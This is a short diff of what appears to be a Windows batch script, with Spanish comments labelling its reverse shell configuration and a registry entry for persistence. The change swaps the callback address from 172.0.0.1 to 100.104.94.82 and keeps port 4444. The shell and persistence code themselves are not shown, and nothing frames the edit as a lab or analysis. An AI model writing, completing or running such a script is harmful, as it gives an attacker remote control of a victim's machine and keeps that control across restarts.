@@ -6,7 +6,7 @@ goto end
 
 :begin
 :: Configuración de la reverse shell
-set IP=172.0.0.1
+set IP=100.104.94.82
 set PORT=4444
 
 :: Crear entrada de registro para persistencia
